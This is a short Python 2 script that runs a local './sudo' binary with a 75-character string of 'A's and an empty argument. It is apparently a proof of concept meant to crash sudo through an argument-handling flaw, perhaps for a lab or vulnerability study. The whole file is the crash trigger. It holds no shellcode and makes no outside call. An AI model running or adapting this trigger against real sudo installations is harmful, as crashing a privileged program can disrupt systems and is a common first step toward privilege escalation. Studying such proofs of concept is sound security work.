import os, sys


PATH_TO_SUDO = './sudo'


def crash_sudo():
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO ,"A"*75, "");


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
